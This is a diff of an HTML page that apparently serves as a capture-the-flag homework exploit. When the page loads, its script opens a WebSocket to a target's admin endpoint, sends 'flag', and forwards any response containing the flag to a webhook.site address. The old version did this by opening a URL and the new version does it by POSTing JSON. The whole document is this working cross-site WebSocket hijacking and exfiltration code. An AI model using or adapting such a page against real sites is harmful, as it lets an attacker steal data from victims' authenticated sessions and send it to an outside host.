@@ -3,41 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retrieve Flag</title>
+    <title>WebSocket and POST Request</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const ws = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws'); // Replace <server-address> with the actual server address
+            const wsUrl = 'ws://hw2-3-web/admin/ws'; // Replace with your Flask WebSocket URL
+            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/store_flag';
+
+            // Open WebSocket connection
+            const ws = new WebSocket(wsUrl);
 
             ws.onopen = () => {
-                console.log('WebSocket connection opened.');
-                ws.send('flag'); // Request the flag
+                console.log('WebSocket connection opened');
+                // Send the "flag" command to retrieve the flag
+                ws.send('flag');
             };
 
             ws.onmessage = (event) => {
-                console.log('Message from server:', event.data);
+                console.log('Received:', event.data);
 
-                // Extract the flag, assuming the flag is sent in the format "{hi}"
-                const match = event.data.match(/\{(.+?)\}/);
-                if (match) {
-                    const flag = match[1]; // Extract the content inside the curly braces
-                    const url = `https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/${flag}`;
-                    
-                    // Open the constructed URL
-                    window.open(url, '_blank'); // Opens the URL in a new tab
+                // Check if the response contains the flag
+                if (event.data.includes('flag{')) {
+                    const flag = event.data;
+
+                    // Send the flag to the webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ flag }),
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Flag sent successfully');
+                        } else {
+                            console.error('Failed to send flag');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
                 }
-                ws.close();
-            };
-
-            ws.onclose = () => {
-                console.log('WebSocket connection closed.');
             };
 
             ws.onerror = (error) => {
                 console.error('WebSocket error:', error);
             };
+
+            ws.onclose = () => {
+                console.log('WebSocket connection closed');
+            };
         });
     </script>
 </head>
 <body>
+    <h1>WebSocket and POST Request</h1>
+    <p>The flag will be retrieved and sent automatically when the page loads.</p>
 </body>
 </html>
